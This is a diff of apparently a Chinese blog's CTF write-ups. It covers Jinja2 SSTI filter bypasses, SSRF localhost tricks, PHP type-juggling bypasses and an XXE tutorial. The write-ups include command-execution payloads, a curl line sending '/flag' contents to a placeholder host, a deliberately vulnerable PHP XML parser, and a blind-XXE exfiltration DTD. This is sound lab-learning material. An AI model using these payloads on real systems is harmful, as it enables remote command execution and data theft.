-<p>payload:<code>name=s&#123;%print((lipsum|attr(request.values.a)).get(request.values.go).popen(request.values.b).read())%&#125;&amp;a=__globals__&amp;b=cat%20/flag&amp;go=os</code></p>
-<p>print里的改为上面的payload2一样的</p>
-<h1 id="web369"><a href="#web369" class="headerlink" title="web369"></a>web369</h1><p>以上基础上ban了request</p>
-<h3 id="方法一"><a href="#方法一" class="headerlink" title="方法一:"></a>方法一:</h3><p>有点小复杂，要写脚本</p>
-<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line">flag = <span class="number">1</span></span><br><span class="line"><span class="keyword">while</span>(flag):</span><br><span class="line"> payload=<span class="built_in">input</span>(<span class="string">&quot;要找啥&quot;</span>)</span><br><span class="line"> fpayload=<span class="string">&quot;&quot;</span></span><br><span class="line"></span><br><span class="line"> <span class="keyword">for</span> j <span class="keyword">in</span> payload:</span><br><span class="line">  <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>,<span class="number">1000</span>):</span><br><span class="line">   url=<span class="string">f&quot;http://e870d70a-c035-4b9e-8e6c-f6137ed08cbe.challenge.ctf.show//?name=&#123;&#123;%print((config|string|list).pop(<span class="subst">&#123;i&#125;</span>).lower())%&#125;&#125;&quot;</span></span><br><span class="line">   r = requests.get(url=url)</span><br><span class="line">   index = r.text.find(<span class="string">&#x27;&lt;h3&gt;&#x27;</span>)</span><br><span class="line">   single = r.text[index+<span class="number">4</span>:index+<span class="number">5</span>].lower()</span><br><span class="line">  <span class="comment">#print(f&quot;[+]&#123;j&#125;&quot;)</span></span><br><span class="line">  <span class="comment">#print(single)</span></span><br><span class="line">   <span class="keyword">if</span> j==single:</span><br><span class="line">    fpayload+=<span class="string">f&quot;(config|string|list).pop(<span class="subst">&#123;i&#125;</span>)~&quot;</span></span><br><span class="line">    <span class="keyword">break</span></span><br><span class="line"></span><br><span class="line">  <span class="built_in">print</span>(<span class="string">&quot;[+]&quot;</span>)</span><br><span class="line">  <span class="built_in">print</span>(payload)</span><br><span class="line">  <span class="built_in">print</span>(<span class="string">&quot;[+]&quot;</span>)</span><br><span class="line">  <span class="built_in">print</span>(fpayload)</span><br><span class="line">  flag = <span class="built_in">input</span>(<span class="string">&quot;继续不&quot;</span>)</span><br></pre></td></tr></table></figure>
-
-<p>思路是把<code>&#123;%print((lipsum|attr('__globals__')).get('os').popen('cat /flag').read())%&#125;</code>这个里面的<code>__globals__</code>和<code>os</code>和<code>cat /flag</code>替换就好</p>
-<p>payload:我的</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&#123;%print((lipsum|attr((config|string|list).pop(74).lower()~(config|string|list).pop(74).lower()~(config|string|list).pop(6).lower()~(config|string|list).pop(41).lower()~(config|string|list).pop(2).lower()~(config|string|list).pop(33).lower()~(config|string|list).pop(40).lower()~(config|string|list).pop(41).lower()~(config|string|list).pop(42).lower()~(config|string|list).pop(74).lower()~(config|string|list).pop(74).lower())).get((config|string|list).pop(2).lower()~(config|string|list).pop(42).lower()).popen((config|string|list).pop(1).lower()~(config|string|list).pop(40).lower()~(config|string|list).pop(23).lower()~(config|string|list).pop(7).lower()~(config|string|list).pop(279).lower()~(config|string|list).pop(4).lower()~(config|string|list).pop(41).lower()~(config|string|list).pop(40).lower()~(config|string|list).pop(6).lower()).read())%&#125;</span><br></pre></td></tr></table></figure>
-
-<h3 id="方法二"><a href="#方法二" class="headerlink" title="方法二:"></a>方法二:</h3><p>通过设置变量和拼接变量合成一句话</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?name=</span><br><span class="line">&#123;% set a=(()|select|string|list).pop(24) %&#125;</span><br><span class="line">&#123;</span><br><span class="line">   % set globals=(a,a,dict(globals=1)|join,a,a)|join %&#125;</span><br><span class="line">&#123;</span><br><span class="line">   % set init=(a,a,dict(init=1)|join,a,a)|join %&#125;</span><br><span class="line">&#123;</span><br><span class="line">   % set builtins=(a,a,dict(builtins=1)|join,a,a)|join %&#125;</span><br><span class="line">&#123;</span><br><span class="line">   % set a=(lipsum|attr(globals)).get(builtins) %&#125;</span><br><span class="line">&#123;</span><br><span class="line">   % set chr=a.chr %&#125;</span><br><span class="line">&#123;</span><br><span class="line">   % print a.open(chr(47)~chr(102)~chr(108)~chr(97)~chr(103)).read() %&#125;</span><br><span class="line">#合成一句话：</span><br><span class="line">?name=&#123;% set a=(()|select|string|list).pop(24) %&#125;&#123;% set globals=(a,a,dict(globals=1)|join,a,a)|join %&#125;&#123;% set init=(a,a,dict(init=1)|join,a,a)|join %&#125;&#123;% set builtins=(a,a,dict(builtins=1)|join,a,a)|join %&#125;</span><br><span class="line">&#123;% set a=(lipsum|attr(globals)).get(builtins) %&#125;</span><br><span class="line">&#123;% set chr=a.chr %&#125;</span><br><span class="line">&#123;% print a.open(chr(47)~chr(102)~chr(108)~chr(97)~chr(103)).read() %&#125;</span><br></pre></td></tr></table></figure>
-
-<p>相当于</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">lipsum.__globals__[&#x27;__builtins__&#x27;].open(&#x27;/flag&#x27;).read()</span><br><span class="line"></span><br><span class="line"># 在__builtins__里面拿到chr，同样可以很方便的构造字符</span><br></pre></td></tr></table></figure>
-
-<h1 id="web370"><a href="#web370" class="headerlink" title="web370"></a>web370</h1><p>过滤了数字,要用cout构造数字</p>
-<p>比如dict{aaaaaa&#x3D;a|join|cout}是等于6的，键值有多少个字符，这个表达式就代表几个数字，想办法用这个格式把上题的payload中的数字替换即可</p>
-<p>payload1:</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&#123;%set nummm=dict(aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa=a)|join|count%&#125;</span><br><span class="line">#32</span><br><span class="line">&#123;%set numm=dict(aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa=a)|join|count%&#125;</span><br><span class="line">#47</span><br><span class="line">&#123;%set num=dict(aaaaaaaaaaaaaaaaaaaaaaaa=a)|join|count%&#125; #24</span><br><span class="line">&#123;%set x=(()|select|string|list).pop(num)%&#125; #_</span><br><span class="line">&#123;%set o=dict(o=a,s=b)|join%&#125;</span><br><span class="line">#os</span><br><span class="line">&#123;%set glob = (x,x,dict(globals=a)|join,x,x)|join %&#125;</span><br><span class="line">#得到__globals__前面的join是把globals变为字符串</span><br><span class="line">&#123;%set builtins=(x,x,dict(builtins=a)|join,x,x)|join%&#125;</span><br><span class="line">#__builtins__</span><br><span class="line">&#123;%set c=dict(chr=a)|join%&#125;</span><br><span class="line">#chr</span><br><span class="line">&#123;%set chr=((lipsum|attr(glob)).get(builtins)).get(c)%&#125;</span><br><span class="line">#chr函数</span><br><span class="line">&#123;%set cmd=dict(cat=a)|join~chr(nummm)~chr(numm)~dict(flag=a)|join%&#125;</span><br><span class="line">#cat /flag</span><br><span class="line">&#123;%print((lipsum|attr(glob)).get(o).popen(cmd).read())%&#125;</span><br><span class="line">#最终payload如下</span><br><span class="line">?name=&#123;%set nummm=dict(aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa=a)|join|count%&#125;&#123;%set numm=dict(aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa=a)|join|count%&#125;&#123;%set num=dict(aaaaaaaaaaaaaaaaaaaaaaaa=a)|join|count%&#125;&#123;%set x=(()|select|string|list).pop(num)%&#125;&#123;%set o=dict(o=a,s=b)|join%&#125;&#123;%set glob = (x,x,dict(globals=a)|join,x,x)|join %&#125;&#123;%set builtins=(x,x,dict(builtins=a)|join,x,x)|join%&#125;&#123;%set c=dict(chr=a)|join%&#125;&#123;%set chr=((lipsum|attr(glob)).get(builtins)).get(c)%&#125;&#123;%set cmd=chr(numm)~dict(flag=a)|join%&#125;</span><br><span class="line">&#123;%set cmd=dict(cat=a)|join~chr(nummm)~chr(numm)~dict(flag=a)|join%&#125;&#123;%print((lipsum|attr(glob)).get(o).popen(cmd).read())%&#125;</span><br></pre></td></tr></table></figure>
-
-<p>payload2:</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&#123;%set num=dict(aaaaaaaaaaaaaaaaaaaaaaaa=a)|join|count%&#125;</span><br><span class="line">&#123;%set numm=dict(aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa=a)|join|count%&#125;</span><br><span class="line">&#123;%set x=(()|select|string|list).pop(num)%&#125;</span><br><span class="line">&#123;%set glob = (x,x,dict(globals=a)|join,x,x)|join %&#125;</span><br><span class="line">&#123;%set builtins=x~x~(dict(builtins=a)|join)~x~x%&#125;</span><br><span class="line">&#123;%set c = dict(chr=a)|join%&#125;</span><br><span class="line">&#123;%set o = dict(o=a,s=a)|join%&#125;</span><br><span class="line">&#123;%set getitem = x~x~(dict(getitem=a)|join)~x~x%&#125;</span><br><span class="line">&#123;%set chr = lipsum|attr(glob)|attr(getitem)(builtins)|attr(getitem)(c)%&#125;</span><br><span class="line">&#123;%set file = chr(numm)~dict(flag=a)|join%&#125;</span><br><span class="line">&#123;%print((lipsum|attr(glob)|attr(getitem)(builtins)).open(file).read())%&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
-
-<h1 id="web371"><a href="#web371" class="headerlink" title="web371"></a>web371</h1><p>过滤了print但还是可以执行命令，用curl带出flag</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&#123;% set one=dict(b=j)|join|count%&#125;</span><br><span class="line">&#123;% set two=dict(bb=j)|join|count%&#125;</span><br><span class="line">&#123;% set three=dict(bbb=j)|join|count%&#125;</span><br><span class="line">&#123;% set four=dict(bbbb=j)|join|count%&#125;</span><br><span class="line">&#123;% set five=dict(bbbbb=j)|join|count%&#125;</span><br><span class="line">&#123;% set six=dict(bbbbbb=j)|join|count%&#125;</span><br><span class="line">&#123;% set seven=dict(bbbbbbb=j)|join|count%&#125;</span><br><span class="line">&#123;% set eight=dict(bbbbbbbb=j)|join|count%&#125;</span><br><span class="line">&#123;% set nine=dict(bbbbbbbbb=j)|join|count%&#125;</span><br><span class="line">&#123;% set ten=dict(bbbbbbbbbb=j)|join|count%&#125;</span><br><span class="line">&#123;% set zero=(one-one)%&#125;</span><br><span class="line">&#123;% set pop=(four*six)%&#125;</span><br><span class="line">&#123;% set a=(()|select|string|list).pop(pop)%&#125;</span><br><span class="line">&#123;% set global=(a,a,dict(globals=d)|join,a,a)|join%&#125;</span><br><span class="line">&#123;% set built=(a,a,dict(builtins=a)|join,a,a)|join%&#125;</span><br><span class="line">&#123;% set go=(lipsum|attr(global)).get(built)%&#125;</span><br><span class="line">&#123;% set chr=go.chr%&#125;</span><br><span class="line">&#123;% set cmd=%&#125;</span><br><span class="line">&#123;%if go.eval(cmd)%&#125;</span><br><span class="line">yes</span><br><span class="line">&#123;%endif%&#125;</span><br></pre></td></tr></table></figure>
-
-<p>cmd生成脚本:</p>
-<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#eg:chr((six~five)|int)~chr((six~six|int))---&gt;AB</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#替换123</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">change</span>(<span class="params">a</span>):</span><br><span class="line">    change = &#123;</span><br><span class="line">        <span class="string">&#x27;0&#x27;</span> : <span class="string">&#x27;zero&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;1&#x27;</span> : <span class="string">&#x27;one&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;2&#x27;</span> : <span class="string">&#x27;two&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;3&#x27;</span> : <span class="string">&#x27;three&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;4&#x27;</span> : <span class="string">&#x27;four&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;5&#x27;</span> : <span class="string">&#x27;five&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;6&#x27;</span> : <span class="string">&#x27;six&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;7&#x27;</span> : <span class="string">&#x27;seven&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;8&#x27;</span> : <span class="string">&#x27;eight&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;9&#x27;</span> : <span class="string">&#x27;nine&#x27;</span></span><br><span class="line">    &#125;</span><br><span class="line">    res = change[a]</span><br><span class="line">    <span class="keyword">return</span> res</span><br><span class="line"></span><br><span class="line"><span class="comment">#拆解payload,并进行ascii转码保存在一个数组中</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">devide</span>(<span class="params">payload</span>):</span><br><span class="line">    go = <span class="built_in">list</span>(payload)</span><br><span class="line">    <span class="keyword">for</span> i,val <span class="keyword">in</span> <span class="built_in">enumerate</span>(go):</span><br><span class="line">        go[i] = <span class="built_in">str</span>(<span class="built_in">ord</span>(val))</span><br><span class="line">    <span class="keyword">return</span> go</span><br><span class="line"></span><br><span class="line"><span class="comment">#获取拼接的字符</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">merge</span>(<span class="params">go</span>):</span><br><span class="line">    temp = <span class="built_in">list</span>(go)</span><br><span class="line">    res = <span class="string">&quot;&quot;</span></span><br><span class="line">    <span class="keyword">for</span> i,val <span class="keyword">in</span> <span class="built_in">enumerate</span>(temp):</span><br><span class="line">        <span class="keyword">if</span> i&lt;<span class="built_in">len</span>(temp)-<span class="number">1</span>:</span><br><span class="line">            res+=change(val)+<span class="string">&quot;~&quot;</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            res+=change(val)</span><br><span class="line">    <span class="keyword">return</span> res    </span><br><span class="line">            </span><br><span class="line">payload = <span class="string">&#x27;__import__(&quot;os&quot;).popen(&quot;curl http://xxxx:23333?`cat /flag`&quot;)&#x27;</span></span><br><span class="line">res = <span class="string">&quot;&quot;</span></span><br><span class="line">ppp = devide(payload)</span><br><span class="line"><span class="keyword">for</span> i,val <span class="keyword">in</span> <span class="built_in">enumerate</span>(ppp):</span><br><span class="line">    <span class="keyword">if</span> i&lt;<span class="built_in">len</span>(ppp)-<span class="number">1</span>:</span><br><span class="line">        res += <span class="string">&quot;chr((&quot;</span>+merge(val)+<span class="string">&quot;)|int)~&quot;</span><span class="comment">#加int的原因是chr()只能传入数字,就是说不接受chr(&#x27;1&#x27;)</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        res += <span class="string">&quot;chr((&quot;</span>+merge(val)+<span class="string">&quot;)|int)&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(res)</span><br></pre></td></tr></table></figure>
-
-<p>小弹一下,成功！</p>
-<p><img   src="/../img/$%7Bfiilename%7D/image-20240412172735048.png"  alt="image-20240412172735048"></p>
-<h1 id="web-372"><a href="#web-372" class="headerlink" title="web 372"></a>web 372</h1><p>把count禁了，只需把上题的count换位length即可</p>
-<h1 id="vulhub复现"><a href="#vulhub复现" class="headerlink" title="vulhub复现"></a>vulhub复现</h1><p>vulhub复现是不能用</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&#123;&#123;&#x27;&#x27;.__class__&#125;&#125;打而且有回显的，又能学到新东西</span><br></pre></td></tr></table></figure>
-
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&#123;% for i in &#x27;&#x27;.__class__.__mro__[1].__subclasses__() %&#125;</span><br><span class="line">    &#123;% if i.__name__==&#x27;_wrap_close&#x27; %&#125;</span><br><span class="line">        &#123;% print i.__init__.__globals__[&#x27;popen&#x27;](&#x27;cat /flag&#x27;).read() %&#125;</span><br><span class="line">    &#123;% endif %&#125;</span><br><span class="line">&#123;% endfor %&#125;</span><br></pre></td></tr></table></figure>
-
-<p>这样还省去了写脚本的时间，多方便啊</p>
+<h1 id="web89"><a href="#web89" class="headerlink" title="web89"></a>web89</h1><p><img   src="/../img/$%7Bfiilename%7D/image-20240302112347828.png"  alt="image-20240302112347828"></p>
+<p><code>intval()</code>获取变量的整数值，如果是变量是数组的话，要看数组里面有没有元素，有元素返回1，没有元素返回0，这里传入一个有元素的数组即可</p>
+<h1 id="web90"><a href="#web90" class="headerlink" title="web90"></a>web90</h1><p><img   src="/../img/$%7Bfiilename%7D/image-20240302113937890.png"  alt="image-20240302113937890"></p>
+<p><code>intval()</code>的第二个参数是用来识别前一个参数是什么进制，如果为0，就是自动检测，0x开头的会被识别为16进制，0开头会被识别为8进制，否则，将使用10进制，这里第二个参数默认为10，就是按十进制识别</p>
+<p>所以把4476转为16进制，在开头加入0x传入即可</p>
+<h1 id="web91"><a href="#web91" class="headerlink" title="web91"></a>web91</h1><p><img   src="/../img/$%7Bfiilename%7D/image-20240302125706558.png"  alt="image-20240302125706558"></p>
+<p>先看这里两个正则&#x2F;^php$&#x2F;im,&#x2F;^php$&#x2F;i</p>
+<p>i:不区分大小写匹配</p>
+<p>m:以每行为一个单位匹配</p>
+<p>^:匹配单位的开头</p>
+<p>$:匹配单位的末尾</p>
+<p>这题要求我们既要满足第一个正则，又不满足第二个正则，而两个的区别在于m，多行匹配与否的问题</p>
+<p>这里的^xxx$意思说要匹配的单位只能是xxx，不要什么都匹配不到</p>
+<p>那么我们只要在第二行有php，第一行没有，就满足了</p>
+<p><strong>payload:%0aphp</strong></p>
+<p>%0a是url编码的换行符</p>
+<h1 id="web92"><a href="#web92" class="headerlink" title="web92"></a>web92</h1><p><img   src="/../img/$%7Bfiilename%7D/image-20240302130355748.png"  alt="image-20240302130355748"></p>
+<p>可以传入4476e1,弱比较时也不会把它转化为4476，因为e一般表示科学计数法，它转化为什么就不知道了,但是intval却可以转化为4476</p>
+<p><img   src="/../img/$%7Bfiilename%7D/image-20240302140721408.png"  alt="image-20240302140721408"></p>
+<p>这里hint是错的，验证过了，其他字母会被弱等于转化然后输出nonono</p>
+<h1 id="web93"><a href="#web93" class="headerlink" title="web93"></a>web93</h1><p><img   src="/../img/$%7Bfiilename%7D/image-20240302132556869.png"  alt="image-20240302132556869"></p>
+<p>上面说了0开头会以八进制识别</p>
+<h1 id="web94"><a href="#web94" class="headerlink" title="web94"></a>web94</h1><p><img   src="/../img/$%7Bfiilename%7D/image-20240302134509330.png"  alt="image-20240302134509330"></p>
+<p>要想输出flag，有三个条件</p>
+<p>1.num不能强等于4476</p>
+<p>2.num中不能有字母</p>
+<p>3.num的开头不能是0(<code>strpos()</code>会返回0第一次出现的位置，从0开始)</p>
+<p>第一种方法:</p>
+<p>绕过<code>strpos()</code>传入+010574,其中+不能在url中直接输入，会被解析为空格,要输入%2B010574</p>
+<p>第二种方法:</p>
+<p>绕过强等于，直接传入4476.0，强度于两边数据类型不同直接返回false</p>
+<h1 id="web95"><a href="#web95" class="headerlink" title="web95"></a>web95</h1><p><img   src="/../img/$%7Bfiilename%7D/image-20240302135645125.png"  alt="image-20240302135645125"></p>
+<p>弱等于，用以上第一种方法</p>
+<h1 id="web96"><a href="#web96" class="headerlink" title="web96"></a>web96</h1><p><img   src="/../img/$%7Bfiilename%7D/image-20240302141223598.png"  alt="image-20240302141223598"></p>
+<p>传入.&#x2F;flag.php即可</p>
+<h1 id="web97"><a href="#web97" class="headerlink" title="web97"></a>web97</h1><p><img   src="/../img/$%7Bfiilename%7D/image-20240302201703858.png"  alt="image-20240302201703858"></p>
+<p>强度于，数组绕过</p>
+<p><code>md5()</code>被传入一个数组时，会返回null，于是我们传入两个数组，结果就是null&#x3D;&#x3D;&#x3D;null,即可绕过</p>
+<p>payload:a[]&#x3D;1&amp;b[]&#x3D;2</p>
+<h1 id="web98"><a href="#web98" class="headerlink" title="web98"></a>web98</h1><p>到这先，先去学别的大类漏洞吧</p>
 ]]></content>
       <categories>
         <category>Write up</category>
       </categories>
       <tags>
+        <tag>php</tag>
         <tag>ctf</tag>
-        <tag>python</tag>
-        <tag>flask</tag>
       </tags>
   </entry>
   <entry>
@@ -674,110 +701,69 @@
       </tags>
   </entry>
   <entry>
-    <title>SSRF-CTFSHOW</title>
-    <url>/2024/03/22/SSRF-CTFSHOW/</url>
-    <content><![CDATA[<h1 id="CTFSHOW"><a href="#CTFSHOW" class="headerlink" title="CTFSHOW"></a>CTFSHOW</h1><span id="more"></span>
+    <title>XXE漏洞学习</title>
+    <url>/2024/02/27/XXE%E6%BC%8F%E6%B4%9E%E5%AD%A6%E4%B9%A0/</url>
+    <content><![CDATA[<h1 id="基于xml文档使用中产生的漏洞"><a href="#基于xml文档使用中产生的漏洞" class="headerlink" title="基于xml文档使用中产生的漏洞"></a>基于xml文档使用中产生的漏洞</h1><span id="more"></span>
 
-<p>ssrf本质是把web服务器当作跳板，请求一些不让直接请求的东西</p>
-<h1 id="web351"><a href="#web351" class="headerlink" title="web351"></a>web351</h1><p><img   src="/../img/$%7Bfiilename%7D/image-20240322173840844.png"  alt="image-20240322173840844"></p>
-<p><code>curl_init()</code>打开一个curl会话</p>
-<p><code>curl_setopt()</code>设置输出流信息:</p>
-<p>第一个是不把头文件信息当作输出流带回</p>
-<p>第二个是把curl_exec请求到的信息统统发回</p>
-<p>payload:<code>url=127.0.0.1/flag.php</code></p>
-<h1 id="web352"><a href="#web352" class="headerlink" title="web352"></a>web352</h1><p><img   src="/../img/$%7Bfiilename%7D/image-20240322175247131.png"  alt="image-20240322175247131"></p>
-<p>payload:</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">url=http://0/flag.php</span><br><span class="line">url=http://0.0.0.0/flag.php</span><br><span class="line">url=http://0x7f.0.0.1/flag.php</span><br><span class="line">url=http://0177.0.0.1/flag.php</span><br><span class="line">缺省模式：127.0.0.1写成127.1</span><br><span class="line">CIDR：url=http://127.127.127.127/flag.php</span><br></pre></td></tr></table></figure>
+<h1 id="XML文档介绍"><a href="#XML文档介绍" class="headerlink" title="XML文档介绍"></a>XML文档介绍</h1><p>xml与html很类似，xml被用来传输数据，html被用来显示数据</p>
+<p>xml文档可为传输的数据进行分类，比如用户填入的数据,姓名，年龄等会以树状结构存储的xml文档中</p>
+<p>1.元素，如<body></body>,老生常态，写法和html几乎一样</p>
+<p>2.属性，与html几乎一样</p>
+<p>3.实体:用来定义普通文本的变量。实体引用是对实体的引用。有点抽象，其实把它当成一个代名词就好</p>
+<p>4.PCDATA:PCDATA 是会被解析器解析的文本。这些文本将被解析器检查实体以及标记。就比如我们的自己定义的元素，属性，这会被解析器当作是特殊的</p>
+<p>5.CDATA:是不会被解析器解析的文本,在xml中保留了一些特殊的字符，比如&amp;,&lt;,当你在文本中不想他们被标记为特殊字符时，就给这段文本标作CDATA</p>
+<p><img   src="/../img/$%7Bfiilename%7D/image-20240227165634626.png"  alt="image-20240227165634626"></p>
+<h1 id="实例"><a href="#实例" class="headerlink" title="实例"></a>实例</h1><p>假设我把用户的数据存储在了xml文档中，我怎么让数据传输到前端并展示呢</p>
+<h2 id="xml文档"><a href="#xml文档" class="headerlink" title="xml文档"></a>xml文档</h2><p><img   src="/../img/$%7Bfiilename%7D/image-20240227170016299.png"  alt="image-20240227170016299"></p>
+<h2 id="展示"><a href="#展示" class="headerlink" title="展示"></a>展示</h2><p><img   src="/../img/$%7Bfiilename%7D/image-20240227170324785.png"  alt="image-20240227170324785"></p>
+<h2 id="实现函数"><a href="#实现函数" class="headerlink" title="实现函数"></a>实现函数</h2><p><img   src="/../img/$%7Bfiilename%7D/image-20240227170349022.png"  alt="image-20240227170349022"></p>
+<p>这里用var_dump()看看他是怎么存储的，实际上就是以每个标签命名，作为myself对象中的一个属性，并把标签中的文本当作属性值，如果有多个标签，就建立一个数组</p>
+<p>如果有嵌套的标签,就再创建一个对象，把它包含的标签再当作属性放在里面</p>
+<p>1.simplexml_loader_file:获取一个xml文档，并把它转为一个对象</p>
+<p>3.file_get_contents:读取一个文件，并把文件内容转为字符串</p>
+<p>2.simplexml_loader_string:读取一个字符串，并把它转化为一个对象</p>
+<h1 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h1><h2 id="前置"><a href="#前置" class="headerlink" title="前置"></a>前置</h2><p>理解漏洞，我们需要理解xml中dtd文件和实体的使用</p>
+<h3 id="dtd"><a href="#dtd" class="headerlink" title="dtd"></a>dtd</h3><p>dtd文件实际就是用来存储上述<code>&lt;!ELEMENT&gt;</code>等声明的文件，它可以内部声明，也可以外部引用。上述实例中我们使用的就是内部声明，现在我们来介绍外部引用</p>
+<p>创建一个t.dtd文件</p>
+<p><img   src="/../img/$%7Bfiilename%7D/image-20240227171708419.png"  alt="image-20240227171708419"></p>
+<p>外部引用它，语法为<code>&lt;!DOCTYPE 根元素 SYSTEM &quot;t.dtd&quot;&gt;</code></p>
+<p><img   src="/../img/$%7Bfiilename%7D/image-20240227171849486.png"  alt="image-20240227171849486"></p>
+<p>正常显示</p>
+<h2 id="实体"><a href="#实体" class="headerlink" title="实体"></a>实体</h2><p>语法<code>&lt;!ENTITY 实体名称 &quot;实体所代的东西&quot;&gt;</code>,引用的两种方式</p>
+<p>1.&amp;实体名;(若要引用外部的实体要在实体名称和实体所代的东西之间加个SYSTEM);</p>
+<p>2.%实体名;这个只能在dtd中使用</p>
+<p><img   src="/../img/$%7Bfiilename%7D/image-20240227172352172.png"  alt="image-20240227172352172"></p>
+<p>可以看到我这里用了叫jump的实体来代名”跳”，而后就会为jump创建一个对象，把”跳”放里面，所以说是实体把，因为它是真真实实存在的一个对象</p>
+<h3 id="实体代名支持的协议"><a href="#实体代名支持的协议" class="headerlink" title="实体代名支持的协议"></a>实体代名支持的协议</h3><p><img   src="/../img/$%7Bfiilename%7D/image-20240227172609101.png"  alt="image-20240227172609101"></p>
+<h2 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h2><h2 id="NCTF-2019-Fake-XML-cookbook"><a href="#NCTF-2019-Fake-XML-cookbook" class="headerlink" title="[NCTF 2019]Fake XML cookbook"></a>[NCTF 2019]Fake XML cookbook</h2><h3 id="题面"><a href="#题面" class="headerlink" title="题面"></a>题面</h3><p><img   src="/../img/$%7Bfiilename%7D/image-20240227214415944.png"  alt="image-20240227214415944"></p>
+<h3 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h3><p><img   src="/../img/$%7Bfiilename%7D/image-20240227214519453.png"  alt="image-20240227214519453"></p>
+<p><img   src="/../img/$%7Bfiilename%7D/image-20240227214625769.png"  alt="image-20240227214625769"></p>
+<p>漏洞点已经非常清晰，这里我们输入的用户密码是以xml文档的形式发回，但是后端代码有错误，报错信息把username所带的值一起发回来了，所以我们只要修改username的值就可以做到文件读取，构造如下</p>
+<p><img   src="/../img/$%7Bfiilename%7D/image-20240227214812065.png"  alt="image-20240227214812065"></p>
+<p>这里不知道它的dtd是什么，所以我们再创建一个dtd声明也没事，只要用了其中的一个根元素即可，这里我试过了用xxe或者user作根元素都是可以打通的</p>
+<p><img   src="/../img/$%7Bfiilename%7D/image-20240227215140471.png"  alt="image-20240227215140471"></p>
+<h2 id="无回显xxe"><a href="#无回显xxe" class="headerlink" title="无回显xxe"></a>无回显xxe</h2><p>有回显的情况可以直接在页面中看到Payload的执行结果或现象，无回显的情况又称为blind xxe，可以使用外带数据通道提取数据，先使用php:&#x2F;&#x2F;filter获取目标文件的内容，然后将内容以http请求发送到接受数据的服务器。</p>
+<p>　<strong>xml.php</strong></p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">libxml_disable_entity_loader (false);</span><br><span class="line">$xmlfile = file_get_contents(&#x27;php://input&#x27;);</span><br><span class="line">$dom = new DOMDocument();</span><br><span class="line">$dom-&gt;loadXML($xmlfile, LIBXML_NOENT | LIBXML_DTDLOAD); </span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
 
-<p>前两个都是用0.0.0.0(代表本机任何ip)来绕过的</p>
-<p>后两个分别是用十六进制和八进制来绕过的</p>
-<h1 id="web353"><a href="#web353" class="headerlink" title="web353"></a>web353</h1><p><img   src="/../img/$%7Bfiilename%7D/image-20240322181428742.png"  alt="image-20240322181428742"></p>
-<p>同上题目</p>
-<h1 id="web354"><a href="#web354" class="headerlink" title="web354"></a>web354</h1><p><img   src="/../img/$%7Bfiilename%7D/image-20240322193022404.png"  alt="image-20240322193022404"></p>
-<p>ban掉了0和1，说明本地的127.0.0.1怎么都绕不过去了</p>
-<p>换一种思路，输入一个解析到127.0.0.1的域名即可</p>
-<p><img   src="/../img/$%7Bfiilename%7D/image-20240322193226851.png"  alt="image-20240322193226851"></p>
-<p>payload:<code>url=http://ecd.tencent.com/flag.php</code></p>
-<h1 id="web355"><a href="#web355" class="headerlink" title="web355"></a>web355</h1><p><img   src="/../img/$%7Bfiilename%7D/image-20240322194654981.png"  alt="image-20240322194654981"></p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">url=http://0/flag.php</span><br><span class="line">url=http://127.1/flag.php</span><br></pre></td></tr></table></figure>
+<p>　<strong>test.dtd</strong></p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;!ENTITY % file SYSTEM</span><br><span class="line">&quot;php://filter/read=convert.base64-encode/resource=file:///c:/xxx.txt&quot;&gt;</span><br><span class="line">&lt;!ENTITY % int &quot;&lt;!ENTITY &amp;#37; send SYSTEM &#x27;http://xxx?p=file;&#x27;&gt;&quot;&gt; </span><br></pre></td></tr></table></figure>
 
-<h1 id="web356"><a href="#web356" class="headerlink" title="web356"></a>web356</h1><p><img   src="/../img/$%7Bfiilename%7D/image-20240322195149266.png"  alt="image-20240322195149266"></p>
-<p><code>url=http://0/flag.php</code></p>
